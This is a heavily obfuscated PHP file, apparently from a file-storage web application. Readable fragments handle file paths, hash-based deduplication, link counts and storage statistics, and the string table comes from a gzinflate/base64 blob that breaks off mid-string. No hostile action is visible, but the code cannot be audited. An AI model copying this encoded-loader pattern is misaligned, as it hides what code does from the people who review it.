$eÎñ‡âĞğ  = IO::init($cëãäŠò™[8]); $Dî›½›…© = $this->makeFilePath($FÅÑ±Áêåí, $eÎñ‡âĞğ ); goto Fà¬ƒØ£í¸; f®•Ì‚„Ú: } public function makeFilePath($BÜºÇíˆƒ‘, $Bøƒêº¤ª×) { goto cïŒ‚İ¨ì; cïŒ‚İ¨ì: $CİŠëàà¢å =& $_SERVER[úÎü]; $c÷¿Éï—ÛÍ = Model($CİŠëàà¢å[1083])->get($CİŠëàà¢å[1694]); $E¹ ÔòÜÉ = KodIO::defaultIO() . date($CİŠëàà¢å[1695]); goto eİ¬è‰ò­á; eİ¬è‰ò­á: $f·Éæ­ù§ = $E¹ ÔòÜÉ . rand_string(5) . short_id(100); $BÜºÇíˆƒ‘ = str_replace($CİŠëàà¢å[8], $CİŠëàà¢å[70], KodIO::clear($BÜºÇíˆƒ‘)); if (!$BÜºÇíˆƒ‘) { $c÷¿Éï—ÛÍ = $CİŠëàà¢å[1696]; } goto c½¦ãšç’; c½¦ãšç’: switch ($c÷¿Éï—ÛÍ) { case $CİŠëàà¢å[1697]: $f·Éæ­ù§ = $f·Éæ­ù§ . $CİŠëàà¢å[91] . $Bøƒêº¤ª×->ext($BÜºÇíˆƒ‘); if ($Bøƒêº¤ª×->ext($BÜºÇíˆƒ‘) == $CİŠëàà¢å[1634]) { $f·Éæ­ù§ .= $CİŠëàà¢å[1383]; } break; case $CİŠëàà¢å[1698]: goto fñ‚Â‡¶§ø; e°÷İ¡ª¨â: CacheLock::lock($Cáƒ½ÖÁ¬²); $cùÒœÛÊ•ö = IO::fileNameAuto($E¹ ÔòÜÉ, $BÜºÇíˆƒ‘); $f·Éæ­ù§ = $E¹ ÔòÜÉ . $cùÒœÛÊ•ö; goto e´ø¹Ìº¤×; fñ‚Â‡¶§ø: $eÛ¥ç”™ = Model($CİŠëàà¢å[1083])->get($CİŠëàà¢å[1379]); $CØ•†â»¹Í = substr(md5($CİŠëàà¢å[1699] . $eÛ¥ç”™ . date($CİŠëàà¢å[688])), 0, 8); $b¡º•´¤Œà = KodIO::defaultDriver(); goto dŠ“âñ‰¨§; dŠ“âñ‰¨§: $E¹ ÔòÜÉ = $CİŠëàà¢å[1081] . $b¡º•´¤Œà[$CİŠëàà¢å[383]] . $CİŠëàà¢å[1700] . date($CİŠëàà¢å[1701]) . $CØ•†â»¹Í . $CİŠëàà¢å[8]; if ($Bøƒêº¤ª×->ext($BÜºÇíˆƒ‘) == $CİŠëàà¢å[1634]) { $BÜºÇíˆƒ‘ .= $CİŠëàà¢å[1383]; } $Cáƒ½ÖÁ¬² = $CİŠëàà¢å[1702] . $E¹ ÔòÜÉ . $BÜºÇíˆƒ‘; goto e°÷İ¡ª¨â; e´ø¹Ìº¤×: if (IO::isTypeObject($f·Éæ­ù§) && !IO::isUploadServer($f·Éæ­ù§)) { $dİ¨‘÷‹Ó¸ = IO::setContent($f·Éæ­ù§, $CİŠëàà¢å[33]); if (!$dİ¨‘÷‹Ó¸) { show_json($CİŠëàà¢å[1703], !1); } } CacheLock::unlock($Cáƒ½ÖÁ¬²); break; goto f÷ØĞ‡µ¥; f÷ØĞ‡µ¥: case $CİŠëàà¢å[1696]: break; default: break; } return $f·Éæ­ù§; goto DÇ¿‰ˆ’; DÇ¿‰ˆ’: } public function addFileByRemote($BŒ£¡ŠÀÂ‰, $a®×Û¹ŸÄÑ, $C¦”À…ô = array()) { goto aù†‡šÍˆé; fÏ¬‘ºê–Æ: $eÆø„’ğÃ… = IO::hashMd5($BŒ£¡ŠÀÂ‰, $eõ¹Ş‰öÁÁ); $E¼¿¥Ş¹° = KodIO::defaultDriver(); $cÌ¿›ÎæŒé = array($CƒáÏˆœº¤[537] => IO::size($BŒ£¡ŠÀÂ‰), $CƒáÏˆœº¤[1704] => 1, $CƒáÏˆœº¤[402] => $a®×Û¹ŸÄÑ, $CƒáÏˆœº¤[736] => $E¼¿¥Ş¹°[$CƒáÏˆœº¤[383]], $CƒáÏˆœº¤[403] => $BŒ£¡ŠÀÂ‰, $CƒáÏˆœº¤[1705] => $C¦”À…ô[$CƒáÏˆœº¤[168]] ? $C¦”À…ô[$CƒáÏˆœº¤[168]] : IO::hashSimple($BŒ£¡ŠÀÂ‰), $CƒáÏˆœº¤[1706] => $eÆø„’ğÃ… ? $eÆø„’ğÃ… : $eõ¹Ş‰öÁÁ); goto AÍÉÏ°ø˜¿; AÍÉÏ°ø˜¿: if ($bÁŒ”‡ğ = $this->addFileCheckExist($cÌ¿›ÎæŒé[$CƒáÏˆœº¤[168]], $cÌ¿›ÎæŒé[$CƒáÏˆœº¤[167]], $cÌ¿›ÎæŒé[$CƒáÏˆœº¤[77]])) { return $bÁŒ”‡ğ; } return $this->addFileData($cÌ¿›ÎæŒé); goto fš¡ã¨Ÿİ¯; aù†‡šÍˆé: $CƒáÏˆœº¤ =& $_SERVER[úÎü]; if (!IO::exist($BŒ£¡ŠÀÂ‰)) { return !1; } $eõ¹Ş‰öÁÁ = $C¦”À…ô[$CƒáÏˆœº¤[167]] ? $C¦”À…ô[$CƒáÏˆœº¤[167]] : $CƒáÏˆœº¤[33]; goto fÏ¬‘ºê–Æ; fš¡ã¨Ÿİ¯: } private function addFileData($a­™ÀÀËÖ¢) { $Aá‘ëÏ‘ =& $_SERVER[úÎü]; if (!$a­™ÀÀËÖ¢) { return !1; } $a­™ÀÀËÖ¢[$Aá‘ëÏ‘[77]] = intval($a­™ÀÀËÖ¢[$Aá‘ëÏ‘[77]]); if (!$a­™ÀÀËÖ¢[$Aá‘ëÏ‘[77]] && strlen($a­™ÀÀËÖ¢[$Aá‘ëÏ‘[168]]) > 32) { $a­™ÀÀËÖ¢[$Aá‘ëÏ‘[77]] = intval(substr($a­™ÀÀËÖ¢[$Aá‘ëÏ‘[168]], 32)); } $bÓ™Ÿíµ¨ß = $this->add($a­™ÀÀËÖ¢); return $this->find($bÓ™Ÿíµ¨ß); } public function addFile($cÜË‡­Ô¹, $c‹ù›ì…†®, $e²™‡ôˆªì = false) { goto fÇ‰ÄÅù›; aî“²“ÏçÉ: $CëèéÌĞŒë = $_SERVER[úÎü][1707] . $BÙ¢ìù¯´ã; CacheLock::lock($CëèéÌĞŒë); if ($bö®…ëÍ = $this->addFileCheckExist($E¼—éÑ—‹¼, $BÙ¢ìù¯´ã, $dĞ¯¾å˜§†)) { CacheLock::unlock($CëèéÌĞŒë); return $bö®…ëÍ; } goto f…Û¥ ­Ê°; f…Û¥ ­Ê°: $eäÏÈè‚¨ = $this->addFileMake($cÜË‡­Ô¹, $dĞ¯¾å˜§†, $E¼—éÑ—‹¼, $BÙ¢ìù¯´ã, $c‹ù›ì…†®, $e²™‡ôˆªì); $eõ˜Šª„‹Ğ = $this->addFileData($eäÏÈè‚¨); CacheLock::unlock($CëèéÌĞŒë); goto d„ç·†Œ‰; d„ç·†Œ‰: return $eõ˜Šª„‹Ğ; goto a„Œ†ÄŒŠ¦; fÇ‰ÄÅù›: $E¼—éÑ—‹¼ = IO::hashSimple($cÜË‡­Ô¹); $BÙ¢ìù¯´ã = IO::hashMd5($cÜË‡­Ô¹); $dĞ¯¾å˜§† = IO::size($cÜË‡­Ô¹); goto aî“²“ÏçÉ; a„Œ†ÄŒŠ¦: } public function addFileMake($bˆß¿ÄÆ¡Š, $d×ñó¸‹Ú, $F’ñß”Ï‡«, $f×áÙ·ØÄ‡, $dÆ©°–ØÓ, $bÕäõä¶ñï) { goto böå”ÅÙÙÛ; bİğÍ‡Íèß: $E×ğğ‰ÏØ = get_path_this($E…Ü’“–‰Ú); if ($bÕäõä¶ñï) { $b—·Ë³Ÿ = IO::move($bˆß¿ÄÆ¡Š, $CÌİ‘ˆ¢”, !1, $E×ğğ‰ÏØ); } else { $b—·Ë³Ÿ = IO::copy($bˆß¿ÄÆ¡Š, $CÌİ‘ˆ¢”, !1, $E×ğğ‰ÏØ); } if (!$b—·Ë³Ÿ) { return !1; } goto cÇÕ¡¸¤ñ; böå”ÅÙÙÛ: $cÚôÓí…„© =& $_SERVER[úÎü]; $E…Ü’“–‰Ú = $this->createFileName($dÆ©°–ØÓ); $CÌİ‘ˆ¢” = get_path_father($E…Ü’“–‰Ú); goto bİğÍ‡Íèß; cÇÕ¡¸¤ñ: $aí‘·ÓÙÌ = KodIO::defaultDriver(); $Fò«­ùôŠ = array($cÚôÓí…„©[537] => $d×ñó¸‹Ú, $cÚôÓí…„©[1704] => 1, $cÚôÓí…„©[402] => $dÆ©°–ØÓ, $cÚôÓí…„©[736] => $aí‘·ÓÙÌ[$cÚôÓí…„©[383]], $cÚôÓí…„©[403] => $E…Ü’“–‰Ú, $cÚôÓí…„©[1705] => $F’ñß”Ï‡«, $cÚôÓí…„©[1706] => $f×áÙ·ØÄ‡); return $Fò«­ùôŠ; goto f­³ƒœ’‡›; f­³ƒœ’‡›: } public function addFileCheckExist($DÊÚ÷çÔĞ, $DÜìŒ‰íê¦, $cã½šŒÏƒÔ) { $dâ¥ÁÜ¯ =& $_SERVER[úÎü]; $Cï­»Ş¨á = $this->findByHash($DÊÚ÷çÔĞ, $DÜìŒ‰íê¦); if (!$Cï­»Ş¨á) { return !1; } $Dƒ…ä¡ó¸‚ = array($dâ¥ÁÜ¯[1704] => intval($Cï­»Ş¨á[$dâ¥ÁÜ¯[1708]]) + 1, $dâ¥ÁÜ¯[537] => $cã½šŒÏƒÔ); $this->where(array($dâ¥ÁÜ¯[436] => $Cï­»Ş¨á[$dâ¥ÁÜ¯[435]]))->save($Dƒ…ä¡ó¸‚); return $Cï­»Ş¨á; } public function remove($BÔëĞ½Åí³) { $this->linkCountChange($BÔëĞ½Åí³, !1); $this->clearEmpty(); return !0; } public function linkAdd($cÆù¿»õ™) { $this->linkCountChange($cÆù¿»õ™, !0); } public function linkCountChange($a¿ÒöÙÔ, $A¨¬ã‹¬Àî) { goto e¹ÑÃ”Æäà; e¹ÑÃ”Æäà: $d…ùòÇÎ =& $_SERVER[úÎü]; if (!$a¿ÒöÙÔ) { return; } if (!is_array($a¿ÒöÙÔ)) { $a¿ÒöÙÔ = array($a¿ÒöÙÔ); } goto F™ÜøÍñ¶; E¤øÙŠø Ã: foreach ($dµÈµõœá¼ as $cå¢Œƒ³³Œ => $eÕÁ«—ø¦Ï) { $dµˆÑŠµÜÑ = $eÕÁ«—ø¦Ï . $d…ùòÇÎ[33]; if (!$Cİ¯İÖ¹[$dµˆÑŠµÜÑ]) { $Cİ¯İÖ¹[$dµˆÑŠµÜÑ] = array(); } $Cİ¯İÖ¹[$dµˆÑŠµÜÑ][] = $cå¢Œƒ³³Œ; } foreach ($Cİ¯İÖ¹ as $eÕÁ«—ø¦Ï => $cğ’ À­ù) { if (!$cğ’ À­ù) { continue; } $eÕÁ«—ø¦Ï = $A¨¬ã‹¬Àî ? $eÕÁ«—ø¦Ï : -intval($eÕÁ«—ø¦Ï); $cŸñÍ™àÛ = array($d…ùòÇÎ[435] => array($d…ùòÇÎ[7], $cğ’ À­ù)); if ($eÕÁ«—ø¦Ï < 0) { $cŸñÍ™àÛ[$d…ùòÇÎ[1708]] = array($d…ùòÇÎ[933], abs($eÕÁ«—ø¦Ï)); } $this->where($cŸñÍ™àÛ)->setAdd($d…ùòÇÎ[1708], $eÕÁ«—ø¦Ï); } goto A°ÂŠ³«¿; F™ÜøÍñ¶: $dµÈµõœá¼ = array(); foreach ($a¿ÒöÙÔ as $cå¢Œƒ³³Œ) { $dµˆÑŠµÜÑ = $cå¢Œƒ³³Œ . $d…ùòÇÎ[33]; if (!$dµÈµõœá¼[$dµˆÑŠµÜÑ]) { $dµÈµõœá¼[$dµˆÑŠµÜÑ] = 0; } $dµÈµõœá¼[$dµˆÑŠµÜÑ]++; } $Cİ¯İÖ¹ = array(); goto E¤øÙŠø Ã; A°ÂŠ³«¿: } public function findByHash($BœÚºÚÁï®, $FæÒ¤¨®Ø¥ = false) { $EìĞç„Ê¥‰ =& $_SERVER[úÎü]; if (!$BœÚºÚÁï® && !$FæÒ¤¨®Ø¥) { return !1; } $Bƒ„áçÓ¾ƒ = array($EìĞç„Ê¥‰[1705] => $BœÚºÚÁï®); if ($FæÒ¤¨®Ø¥) { $Bƒ„áçÓ¾ƒ = array($EìĞç„Ê¥‰[1706] => $FæÒ¤¨®Ø¥); } return $this->order($EìĞç„Ê¥‰[1709])->where($Bƒ„áçÓ¾ƒ)->find(); } public function clearEmpty($Eà™ä²ç´³ = 0) { goto C”Ì‚…ø¬; F­ƒª¼ÃœÃ: foreach ($AœŒº’˜·Ñ as $Cë»Ğ†‚âö) { $D“£«ùŠÄ¢->update(1); $this->resetFile($Cë»Ğ†‚âö); } $D“£«ùŠÄ¢->end(); goto AƒâË¾¿â; C”Ì‚…ø¬: $A ´ƒÂÁ =& $_SERVER[úÎü]; $D·é‹íÀ–Â = time() - 3600 * 24 * $Eà™ä²ç´³; $e›èÒ¡©â = $A ´ƒÂÁ[1710] . $D·é‹íÀ–Â; goto b•Ä¹ñõ¾; b•Ä¹ñõ¾: $AœŒº’˜·Ñ = $this->where($e›èÒ¡©â)->select(); if (!$AœŒº’˜·Ñ) { return; } $D“£«ùŠÄ¢ = new Task($A ´ƒÂÁ[1711], $A ´ƒÂÁ[33], count($AœŒº’˜·Ñ)); goto F­ƒª¼ÃœÃ; AƒâË¾¿â: } public function resetFile($dñ–Ê¼ÄĞ) { goto C¿İæ²Ø÷§; eã¸Ú¡ìÀŒ: $f—İ˜²§Ï¦ = Model($eÅáö·£—´[1712])->where($E±£ÃÊŒ¸í)->count(); $Aæƒ†áêäà = intval($eÕ¢½àÂ‰º) + intval($f—İ˜²§Ï¦); if ($Aæƒ†áêäà == 0) { IO::remove($dñ–Ê¼ÄĞ[$eÅáö·£—´[75]]); $this->where($E±£ÃÊŒ¸í)->delete(); $this->metaSet($dñ–Ê¼ÄĞ[$eÅáö·£—´[435]], null, null); return; } goto Fç°ËèŠËê; Fç°ËèŠËê: if ($dñ–Ê¼ÄĞ[$eÅáö·£—´[1708]] != $Aæƒ†áêäà) { $this->where($E±£ÃÊŒ¸í)->save(array($eÅáö·£—´[1704] => $Aæƒ†áêäà)); } goto dƒÎÀ”ÑĞğ; C¿İæ²Ø÷§: $eÅáö·£—´ =& $_SERVER[úÎü]; $E±£ÃÊŒ¸í = array($eÅáö·£—´[436] => $dñ–Ê¼ÄĞ[$eÅáö·£—´[435]]); $eÕ¢½àÂ‰º = Model($eÅáö·£—´[1162])->where($E±£ÃÊŒ¸í)->count(); goto eã¸Ú¡ìÀŒ; dƒÎÀ”ÑĞğ: } public function storageInfo($Eæ¿÷¼‘„Ô = false) { goto aôô÷Îİñ; AÅÏ³»ôà«: $f¥ÂÕ¶Ôùê = 1; $d˜‰°­êÍ = 0; $bšª²‡Áš = 5000; goto dÆÙ¤¼„è; aôô÷Îİñ: $EŠº«çÉä“ =& $_SERVER[úÎü]; $aÁ‘ß†œã = $this->count() + 0.0; $aÃ¥ìŸ¡¢© = 0; goto AÅÏ³»ôà«; dÆÙ¤¼„è: for ($DÄŒåøŠÊš = 0; $DÄŒåøŠÊš < $aÁ‘ß†œã; $DÄŒåøŠÊš = $DÄŒåøŠÊš + $bšª²‡Áš) { $eÎ²ÇˆëÄà = $this->limit($DÄŒåøŠÊš, $DÄŒåøŠÊš + $bšª²‡Áš)->select(); foreach ($eÎ²ÇˆëÄà as $Dò§¤àÌ½) { $f¥ÂÕ¶Ôùê += $Dò§¤àÌ½[$EŠº«çÉä“[77]] * $Dò§¤àÌ½[$EŠº«çÉä“[1708]]; $aÃ¥ìŸ¡¢© += $Dò§¤àÌ½[$EŠº«çÉä“[77]] * ($Dò§¤àÌ½[$EŠº«çÉä“[1708]] - 1); $d˜‰°­êÍ += $Dò§¤àÌ½[$EŠº«çÉä“[1708]]; } } $aËŸô”ì— = array($EŠº«çÉä“[1713] => $f¥ÂÕ¶Ôùê, $EŠº«çÉä“[1714] => $aÃ¥ìŸ¡¢©, $EŠº«çÉä“[1715] => $aÃ¥ìŸ¡¢© / $f¥ÂÕ¶Ôùê, $EŠº«çÉä“[81] => $aÁ‘ß†œã, $EŠº«çÉä“[1716] => $d˜‰°­êÍ); return $aËŸô”ì—; goto AÛ¾©Ô¥Ò; AÛ¾©Ô¥Ò: } } goto fÙµ½ƒÙ”Ö; cñÂ„“É: if (!function_exists('_kodDe')) { function _kodDe($bîª‘“ìå†) { $bîª‘“ìå† = base64_decode($bîª‘“ìå†); $cÇÜ“œ“Ì = strlen($bîª‘“ìå†); $b£‰ÂµİÍØ = ''; $c¤†¸è‹˜í = ord($bîª‘“ìå†[0]) - 30; for ($A ïòõÉˆŒ = 1; $A ïòõÉˆŒ < $cÇÜ“œ“Ì; $A ïòõÉˆŒ += 2) { if ($A ïòõÉˆŒ + 1 < $cÇÜ“œ“Ì) { $b£‰ÂµİÍØ .= chr(ord($bîª‘“ìå†[$A ïòõÉˆŒ + 1]) + $c¤†¸è‹˜í); $b£‰ÂµİÍØ .= chr(ord($bîª‘“ìå†[$A ïòõÉˆŒ]) + $c¤†¸è‹˜í); } else { $b£‰ÂµİÍØ .= chr(ord($bîª‘“ìå†[$A ïòõÉˆŒ]) + $c¤†¸è‹˜í); } } return $b£‰ÂµİÍØ; } } define("\372\316\374", "\345\274\252\312\267\270"); $_SERVER[úÎü] = explode("\x7c\x1\x7c\x5\x7c\x4", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\255\275\11\140\123\125\366\60\216\243\343\50\52\243\343\276\77\52\330\226\146\51\5\132\50\224\222\266\151\33\110\233\222\244\254"."\201\360\222\274\244\257\115\362\322\367\136\272\1\72\352\250\10\56\203\373\72\216\353\250\310\46\340\202\13\156\310\250\243\343\270\214\270\216\16\233\342\62\216\77\134".base64_decode('Uee7+73vJTi////7EMnd313OPfecc88598pHblu9ctuSg5b8cskh3+Mf8B/8')."\27\205\317\134\161\330\60\364\347\340\25\313\313\312\132\253\207\127\264\37\171\305\306\325\362\275\362\152\371\222\200\377\305\277\370\216\172\371\376\351\336\335\167\274\70".strrev('pà©ªÓz1ş7_âÍXp¦©6Zâ¦ 2’™«)âÖëŒ(-Tb½ì‡a û¸').base64_decode('tD0QjoY6Ozq8wXCUtCjmZ7QECeVkXc6QxnOKboBPic1Fc1pOyVpSeEJCNuWY')."\x6c\x90\x96\x9a\x1a\xa2\x4d\xde\xe\x7f\x60\x6e\x34\x3c\xb7\xc3\x4b\x4a\xc4\xa2\xbd\x79\x45\x1f\xc4\x31\x14\xc\x99\xb2\x6e\x86\xd5\x8c\xc2\x4a\xf4\xeb\xac\x5f\xd\xde\x16\x5f\xbb".base64_decode('FA562kOexrAv0I6TGwNtbb5wYXow4Pc3eBpnFOZ0BD0tbR4J9C+tRNVsUiuT')."\26\341\234\105\122\71\16\64\253\112\72\201\203\131\231\166\307\34\314\221\120\230\205\300\32\144\363\351\64\216\264\263\20\351\277\222\224\363\151\62\147\115\142\44\247".base64_decode('qxmZDn2GMshScUDOm5qajeOId8DUZZ4OehzXlYySJU2FvH5vY1iC3ZSag4E2')."\211\54\105\106\66\114\105\227\146\267\172\203\136\11\166\275\256\24\215\270\124\302\365\72\333\301\204\110\36\277\137\72\120\13\246\222\311\321\146\160\235\42\215\5\202"."\115\336\240\324\60\127\342\363\24\327\62\31\55\353\2\255\200\365\64\205\256\172\203\101\34\160\20\10\366\373\340\322\221\110\240\271\71\344\145\61\62\270\231\176\320"."\x93\x71\x4\x4a\x2d\xb1\x44\x32\x6d\x46\xfb\xe4\x74\x9e\x2\x6b\xf\xfe\x2d\x25\x3f\xe4\x57\x33\x8\x0\xf7\xaa\x59\x35\x4f\x80\x95\x34\xa1\x69\x6c\xe7\x90\x40\x9e\x96\x56\x68\x4a"."\x6\x54\xd3\xc8\x9e\x2\x1b\xac\xf\x7\xeb\xa6\xe2\xdf\xc9\xa4\x50\x2c\xa\xf3\x14\xdd\x8c\x2a\xd9\xb8\x96\x50\xb3\x64\x1b\xd6\x93\x2d\x47\x0\x4f\x36\xbb\x9a\x74\x15\x94\x23\xd"."\x6a\xae\xb8\x96\x1b\x6c\xd3\xfa\xc8\x18\x92\x6a\x5a\xf1\xb3\x5d\x96\xd4\xd2\x9\x45\xe7\xf1\x1c\xa8\x2e\xe6\x90\xc1\xa8\x43\x42\xed\xf6\x7c\x46\x2c\xc2\xa2\xf1\x2e\x35\x9d\xd0\xe9"."\xe6\xfc\xb9\x92\x63\x49\xb3\x8a\x69\x82\x61\x18\xb4\xa7\x9d\xb9\xb4\x26\x27\x42\x8a\x2e\xf4\xbe\x19\x34\x13\xc8\x9b\x62\x62\x1e\x15\x6b\xd6\xf4\x4c\x13\x40\x0\x64\x76\x0\xd8\xab"."\x9d\x45\x32\x7a\x28\xe0\x27\x84\x49\x71\x11\xc4\x55\x36\xff\x3c\xe7\x4f\xb\xe6\x4f\x3\xff\x94\x13\x2c\x16\x21\x5d\xeb\x52\xd2\xe9\xa8\x32\xa0\x90\xd\x92\x49\x4c\x30\x68\xef\xdd"."\106\114\315\272\101\12\216\372\2\321\56\331\350\152\113\114\210\242\132\24\71\46\224\1\127\256\53\107\366\60\333\266\21\13\0\303\371\156\327\114\257\200\142\323\132"."\x5c\x4e\x8b\x23\xc5\xe1\x2e\xd3\xcc\x85\x94\x6c\x2\x4e\x8\x19\x91\xd6\x9f\x45\x13\x96\x53\x14\x52\xa8\xc9\x21\x25\xa4\x36\x69\xae\xd4\x5a\xab\xd6\x52\xe8\x2\xb0\x92\x1c\xe4\x18"."\257\313\314\244\131\210\216\226\245\31\54\321\34\40\60\121\102\342\312\200\111\46\111\232\34\357\222\165\260\174\165\171\63\351\234\110\20\107\56\227\126\343\262\251\152"."\131\267\26\67\25\323\151\230\272\42\223\326\74\361\270\142\30\316\106\55\153\352\132\332\351\111\247\265\176\147\100\127\123\152\266\126\32\103\320\54\310\4\33\331\11".base64_decode('UV8t2Z0lkyUISXDnj8Ffo7uOldblrJFUdKeXbItaCawPw3y0WJNq5DRDhd2r')."\225\144\323\224\343\135\20\153\360\346\353\176\246\274\232\115\253\131\245\240\254\167\40\247\352\212\101\373\52\265\264\205\111\43\240\165\305\331\241\313\251\214\134\53\345"."\xf2\x31\x30\x33\x64\x7f\x16\x49\xc3\xa5\xc9\xd4\xd4\x4a\x71\x18\x75\x48\x99\xbc\x61\x3a\x75\x5\xa0\x1f\x15\x1c\x74\x64\xf1\x7c\x49\x67\x1b\x5c\x4f\x55\x49\x38\x43\x0\x4b\x93\xe4".base64_decode('cZXjJQBGEs3Dqa3hcEfU1wwO43ZvtM0Tbmwl3TblFO2zH+Be1iRNnOMEWw4C')."\x5a\x3b\x18\x2b\x4f\xec\xd0\xfa\x15\x1d\x7c\xb8\x61\xb0\x56\xea\xd1\x12\x31\x6d\xc0\x45\xb3\x60\xe1\x10\xc0\x12\xb4\x30\x5c\xee\x9c\xe9\xc\xca\xd9\x14\x9c\x9f\xd8\xa0\xa9\x10\x70"."\64\372\122\326\211\366\53\331\224\331\105\53\206\274\301\131\336\140\64\24\150\16\317\366\4\311\61\236\5\120\62\100\77\5\233\116\73\203\112\2\114\175\334\244\365"."\xe4\x1c\x9c\x35\x5a\x6\x6e\x14\xb8\x56\x34\x17\x6e\x1e\x9a\xe7\xf7\xb5\xc0\x89\x69\x72\x1a\xa0\x90\x53\x2c\x45\xdb\xf6\xab\x19\x15\xf6\xdd\x64\x39\x68\x26\xc1\x19\xdf\x42\x3a\xe4"."\x46\x3\xaa\x8b\x74\x8d\x29\x8b\x24\x2a\xca\x9d\xe0\xdf\x31\xe5\xf3\x23\x4d\xae\x31\xb\xea\xdd\x2a\xaf\xe3\x1e\xeb\x1a\x2b\x55\x55\x56\x4b\x1d\x80\xe8\x50\xe5\xb4\x44\x6\x5d\x50"."\242\122\12\314\370\231\11\200\147\222\260\315\155\123\207\23\203\336\231\235\336\120\70\332\346\15\267\6\232\310\27\274\36\22\362\153\170\153\322\21\315\307\77\13\134"."\x1c\x5b\x83\x35\xf7\x65\xe4\x94\xe2\x3\xe4\xa\x4f\x85\xb1\x36\x4d\x57\xac\x29\xfc\x5c\x98\xad\x26\xe8\x91\x1\xa3\xad\x8a\x9a\xea\x22\xe3\x53\x61\x6b\x71\x2d\xad\xe9\x72\x1a\x62".base64_decode('NQrECsUsKTVJ1gcjUB4JqZkcxXNmVz4TE4Ju3hXyXbDyDLtp7CjTdBKqdZMq').strrev('ÒìÅ6‘KuS¦êhÙù‘U§%Œi8NÆ”œ„Z	LŒ´\'A¿Æ‡vÎ)š«£')."\310\162\245\24\332\245\74\353\33\355\145\102\111\53\164\136\272\24\212\354\1\225\326\307\246\13\220\142\40\314\21\270\152\4\101\101\110\32\321\370\154\110\301\362\4"."\x93\x15\x4d\x83\x63\x25\x10\xeb\x6\xfb\x84\x10\x9\xaa\xd1\x2c\x9c\xeb\x51\xd\xe5\x81\xbe\xca\xbc\x7c\x87\xae\x24\x55\xb2\xdb\xb2\x60\xa9\xda\x64\xbd\x87\x56\x0\x4b\xc3\xcf\x1f"."\30\21\32\153\356\364\373\243\215\201\366\60\240\212\161\312\354\240\57\354\245\300\351\151\212\172\32\73\330\151\312\227\232\24\200\230\242\360\30\300\51\175\125\302\21"."\304\317\52\216\305\351\231\13\261\64\16\3\264\234\323\262\206\342\214\223\326\22\34\237\343\22\223\155\310\274\240\6\247\305\7\234\162\146\310\231\1\323\344\144\135"."\xb7\x1e\xb5\x52\x58\x3c\xb1\x7d\x64\x19\x39\xde\x86\x13\xb\x58\x1d\x7a\xc6\x77\x4\x42\xa4\x42\x3d\x4c\x5\x84\x51\x4c\xd1\x49\x3f\x3a\x3a\x49\x56\x46\x0\xa1\x16\x2f\x49\x1c\x4e"."\217\151\231\20\121\236\331\41\212\163\363\240\274\256\16\311\174\214\365\264\77\244\355\201\114\232\323\172\326\121\71\371\132\204\133\175\355\63\242\155\201\46\257\77\352"."\153\7\10\51\134\230\336\331\321\344\241\213\53\246\67\4\302\255\226\324\116\200\222\146\171\374\76\173\161\357\34\137\50\34\52\232\5\322\72\275\266\34\300\335\165"."\x4\xbd\xcd\xbe\x39\x2c\xda\xec\xf3\xfa\x9b\x42\xd1\x46\x4f\x63\x2b\x2f\xd3\xee\x69\x23\x91\x68\x12\xf2\x57\x86\xdb\x5a\x3e\xa\x70\x6b\x88\x71\x69\xd1\x3e\xc8\x71\xd2\xc9\x8a\x5a"."\x58\xa2\x28\x25\xf6\xa3\x1c\xe\xc0\x39\xa9\x10\xd8\x23\xc3\x85\x7c\x2e\x1a\x9\x21\xbf\xe3\x5a\x9e\x42\x23\xa3\x17\x33\x14\x89\x64\x64\xb2\xad\x64\x7a\x6\x96\xe1\x9f\x72\xc9\x13".base64_decode('ksxclKGL2CALomHQOKAMyfclgucLehCFZRqUJEPZxRM8SZNhAVsc7AueB1bA')."\203\30\152\0\11\150\105\242\164\257\31\200\25\361\320\356\44\71\63\33\15\0\256\337\3\131\341\350\354\140\240\275\205\124\350\357\122\150\7\174\144\372\313\50\335"."\x44\x38\x62\x93\xa3\x30\x40\xf4\xc8\x9c\x7e\xa5\x93\xde\xad\xd1\xa9\x5c\x82\x7f\xce\xc6\x3f\x80\xde\x23\x1f\x57\xb2\x74\xd6\x63\x10\x79\x33\xc4\x40\xd9\x1d\xb0\x1b\x28\xe2\xd5\xf2"."\xec\x6b\x31\x4d\x4b\xd3\x7d\xa\x8e\x7e\x86\xf\x18\x2f\xdd\x6d\x50\x20\x19\xa0\xc8\xa7\x82\x9e\x65\xe4\x0\x9\x7\x66\x78\xdb\xa3\x14\xb2\x70\x4c\x80\x46\x9c\x0\xb8\xd3\x40\x90".base64_decode('TIip9VBeCWcGvSG6y3WlN6/S6XK7KggUK+CMIp93L4z0V5TNd1a4FoBA+Zhp').base64_decode('OEpiEZclOorUz+usNqSIyoz68tqIO+Iuq6+d73EOyc6hSuck54KKiKu8giQs')."\130\134\345\30\277\24\26\0\5\353\317\132\0\176\352\42\365\243\43\316\263\317\131\64\155\176\144\101\151\155\305\310\210\353\254\110\377\202\61\345\365\364\73\361\274".base64_decode('DvjA+CDraqKiDHQJUEqsSBahPKEAzRhSczx1cfVSmg7WUEnxGvOdkYoF9UI9')."\41\311\376\55\100\45\1\374\333\305\312\171\234\363\340\310\130\125\270\357\11\174\344\263\161\216\75\341\276\210\311\161\202\7\324\124\226\155\41\160\350\63\376\333\112"."\xa0\x2f\x1e\x8d\x7f\x97\xd2\x85\x4c\x29\x3\x14\x35\x64\x93\xaa\x4e\xa0\x33\x9f\x55\x7b\xa9\x54\x21\xab\xf4\x92\x80\x66\x52\xf8\x8e\x29\x66\xbf\x42\xc1\x3\xa4\x5b\xe2\x0\x38\x28"."\x87\x8\xb2\x84\x58\x1a\xd1\x83\xe4\xb\x9c\x33\x53\x10\x9b\x42\x46\x91\x8b\x42\x62\xac\x9f\xc5\x12\x4a\x96\xac\xd3\xe1\xa4\xb4\x11\x97\x73\x4a\x48\x18\x61\x34\x1a\xf6\x34\xf8\xbd".base64_decode('UYphCCamcYQVG5gcDgyNY1SKH+KcOkeMCNn5Rm9aQohBUnRd02uRvNHI5yDt')."\6\230\56\23\314\255\4\70\170\251\156\252\204\247\234\324\213\212\13\220\223\51\345\0\231\152\106\15\270\313\42\221\374\174\45\261\140\76\0\152\331\231\134\260\170".base64_decode('3NJySpy7I+APjWBcRnqf42tpANqMUk6eImKxKMOGsAtMuqHpjCbKWchpUzPl').base64_decode('NCsG88IwhWIeei4T0QBeTD9HSPCkFoSGCFu2M4kYE3QI8iqQ5hCi+N+6Eoqy')."\xb3\x60\x53\x34\xa\x7\x16\x16\xc7\x84\x6\xd\x53\xc9\x58\x44\x89\x86\x22\xeb\xf1\xae\xe6\x7c\x3